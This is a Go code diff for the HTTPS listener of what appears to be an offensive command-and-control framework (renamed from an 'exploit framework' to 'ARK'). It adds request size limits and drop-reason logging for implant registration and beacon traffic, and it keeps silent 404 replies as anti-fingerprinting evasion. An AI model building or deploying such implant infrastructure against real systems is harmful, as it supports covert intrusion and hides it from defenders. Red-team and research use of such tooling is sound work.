@@ -13,11 +13,16 @@ import (
 	"sync"
 	"time"
 
-	zcrypto "github.com/KKingZero/erebus-exploit-framwork/pkg/crypto"
-	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
-	"github.com/KKingZero/erebus-exploit-framwork/server/sessions"
-	"github.com/KKingZero/erebus-exploit-framwork/server/tasks"
+	zcrypto "github.com/KKingZero/ARK/pkg/crypto"
+	pb "github.com/KKingZero/ARK/pkg/pb"
+	"github.com/KKingZero/ARK/server/sessions"
+	"github.com/KKingZero/ARK/server/tasks"
 	"google.golang.org/protobuf/proto"
+)
+
+const (
+	maxRegisterBody = 1 << 16
+	maxBeaconBody   = 1 << 20
 )
 
 // BeaconHandler processes Register and Beacon messages from implants.
@@ -206,19 +211,22 @@ func (l *HTTPSListener) resolveRemoteAddr(r *http.Request) string {
 
 func (l *HTTPSListener) handleRegister(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
+		// Silent 404 — anti-fingerprint (wrong method is not an operator auth issue).
 		http.NotFound(w, r)
 		return
 	}
 
-	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<16))
+	body, err := readLimitedBody(r.Body, maxRegisterBody)
 	if err != nil {
+		// Wire stays 404; log reason for operators (reason=io|parse|unknown_implant|hmac|skew|replay|internal).
+		log.Printf("[https] register drop reason=io: %v", err)
 		http.NotFound(w, r)
 		return
 	}
 
 	reg := &pb.Register{}
 	if err := proto.Unmarshal(body, reg); err != nil {
-		// Silent drop — no fingerprinting
+		log.Printf("[https] register drop reason=parse len=%d: %v", len(body), err)
 		http.NotFound(w, r)
 		return
 	}
@@ -229,7 +237,7 @@ func (l *HTTPSListener) handleRegister(w http.ResponseWriter, r *http.Request) {
 		if errors.Is(err, ErrBeaconAuth) {
 			log.Printf("[https] register drop implant=%s: %v", reg.GetImplantId(), err)
 		} else {
-			log.Printf("[https] register error implant=%s: %v", reg.GetImplantId(), err)
+			log.Printf("[https] register drop reason=internal implant=%s: %v", reg.GetImplantId(), err)
 		}
 		http.NotFound(w, r)
 		return
@@ -246,14 +254,16 @@ func (l *HTTPSListener) handleBeacon(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
+	body, err := readLimitedBody(r.Body, maxBeaconBody)
 	if err != nil {
+		log.Printf("[https] beacon drop reason=io: %v", err)
 		http.NotFound(w, r)
 		return
 	}
 
 	beacon := &pb.Beacon{}
 	if err := proto.Unmarshal(body, beacon); err != nil {
+		log.Printf("[https] beacon drop reason=parse len=%d: %v", len(body), err)
 		http.NotFound(w, r)
 		return
 	}
@@ -263,7 +273,7 @@ func (l *HTTPSListener) handleBeacon(w http.ResponseWriter, r *http.Request) {
 		if errors.Is(err, ErrBeaconAuth) {
 			log.Printf("[https] beacon drop implant=%s: %v", beacon.GetImplantId(), err)
 		} else {
-			log.Printf("[https] beacon error implant=%s: %v", beacon.GetImplantId(), err)
+			log.Printf("[https] beacon drop reason=internal implant=%s: %v", beacon.GetImplantId(), err)
 		}
 		http.NotFound(w, r)
 		return
@@ -272,4 +282,15 @@ func (l *HTTPSListener) handleBeacon(w http.ResponseWriter, r *http.Request) {
 	data, _ := proto.Marshal(resp)
 	w.Header().Set("Content-Type", "application/octet-stream")
 	w.Write(data)
+}
+
+func readLimitedBody(r io.Reader, max int64) ([]byte, error) {
+	body, err := io.ReadAll(io.LimitReader(r, max+1))
+	if err != nil {
+		return nil, err
+	}
+	if int64(len(body)) > max {
+		return nil, fmt.Errorf("body too large: %d bytes exceeds %d", len(body), max)
+	}
+	return body, nil
 }
